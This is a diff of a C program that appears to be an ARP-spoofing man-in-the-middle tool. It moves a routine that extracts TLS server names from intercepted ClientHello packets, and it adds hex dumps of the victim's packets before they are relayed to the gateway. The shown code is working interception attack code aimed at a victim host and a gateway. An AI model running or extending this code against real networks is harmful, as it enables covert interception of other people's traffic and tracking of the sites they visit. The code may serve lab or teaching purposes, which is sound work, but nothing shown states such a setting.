@@ -400,6 +400,44 @@ void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, co
     }
 }
 
+
+void get_server_name(unsigned char *buffer, int size){
+    // Skip the Ethernet, Ip, TCP headers
+    struct ethhdr * eth = (struct ethhdr *)(buffer);
+    unsigned short ethhdrlen = sizeof(struct ethhdr);
+    struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
+    unsigned short iphdrlen = iph->ihl*4;
+    struct tcphdr *tcph = (struct tcphdr *)(buffer + iphdrlen + ethhdrlen);
+    unsigned short tcphdrlen = tcph->doff*4;
+
+    // Check if the packet is long enough to contain a TLS record
+    if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
+        return;
+    }
+
+    // Get the server name indication
+    TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
+    if (tls->content_type == 0x16){
+        ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
+        if (client_hello->handshake_type == 0x01) { // Client hello handshake type
+            uint8_t *ptr = client_hello->extensions;
+            uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
+            while (ptr < end){
+                Extension *ext = (Extension*)ptr;
+                if (ntohs(ext->extension_type) == 0x0000){  // 0x0000: server name
+                    ServerName *server_name = (ServerName*)ext->extension_data;
+                    printf("Server name: ");
+                    for (int i = 0; i < ntohs(server_name->server_name_length); i++){
+                        printf("%c", server_name->server_name[i]);
+                    }
+                    printf("\n");
+                }
+                ptr += ntohs(ext->extension_length) + 4;
+            }
+        }
+    }
+}
+
 void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC) {
     int sockfd;
     struct sockaddr_ll gatewayAddr, victimAddr;
@@ -441,6 +479,12 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
         if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
             // Modify the destination MAC address to the gateway's MAC address
             
+            printf("Packet from victim\n");
+            for(int i = 0; i < packetSize; i++){
+                printf("%02x ", buffer[i]);
+            }
+            printf("\n\n\n");
+
             memset(&gatewayAddr, 0, sizeof(struct sockaddr_ll));
             gatewayAddr.sll_family = AF_PACKET;
             gatewayAddr.sll_protocol = htons(ETH_P_ALL);
@@ -455,18 +499,17 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
             if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&gatewayAddr, sizeof(struct sockaddr_ll)) < 0) {
                 perror("sendto");
                 continue;
-            }
-            
-            printf("Packet from victim\n");
-            for(int i = 0; i < packetSize; i++){
-                printf("%02x ", buffer[i]);
-            }
-            printf("\n\n\n");
+            }          
         }
         
         // Check packet from the gateway
         else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0){
            
+            // printf("Packet from gateway\n");
+            // for (int i = 0; i < packetSize; i++){
+            //     printf("%02x ", buffer[i]);
+            // }
+            // printf("\n\n\n");
 
             memset(&victimAddr, 0, sizeof(struct sockaddr_ll));
             victimAddr.sll_family = AF_PACKET;
@@ -487,56 +530,10 @@ void captureAndForward(const char* interfaceName, const struct in_addr victimIP,
         }
         else {
             get_server_name(buffer, packetSize);
-
-            // printf("Packet of attacker\n");
-            // for (int i = 0; i < packetSize; i++){
-            //     printf("%02x ", buffer[i]);
-            // }
-            // printf("\n\n\n");
-        }
-          
+        }          
     }
-
     close(sockfd);
 }
-
-void get_server_name(unsigned char *buffer, int size){
-    // Skip the Ethernet, Ip, TCP headers
-    struct ethhdr * eth = (struct ethhdr *)(buffer);
-    unsigned short ethhdrlen = sizeof(struct ethhdr);
-    struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
-    unsigned short iphdrlen = iph->ihl*4;
-    struct tcphdr *tcph = (struct tcphdr *)(buffer + iphdrlen + ethhdrlen);
-    unsigned short tcphdrlen = tcph->doff*4;
-
-    // Check if the packet is long enough to contain a TLS record
-    if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
-        return;
-    }
-
-    // Get the server name indication
-    TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
-    if (tls->content_type == 0x16){
-        ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
-        if (client_hello->handshake_type == 0x01) { // Client hello handshake type
-            uint8_t *ptr = client_hello->extensions;
-            uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
-            while (ptr < end){
-                Extension *ext = (Extension*)ptr;
-                if (ntohs(ext->extension_type) == 0x0000){  // 0x0000: server name
-                    ServerName *server_name = (ServerName*)ext->extension_data;
-                    printf("Server name: ");
-                    for (int i = 0; i < ntohs(server_name->server_name_length); i++){
-                        printf("%c", server_name->server_name[i]);
-                    }
-                    printf("\n");
-                }
-                ptr += ntohs(ext->extension_length) + 4;
-            }
-        }
-    }
-}
-
 
 
 int main(int argc, char* argv[]){
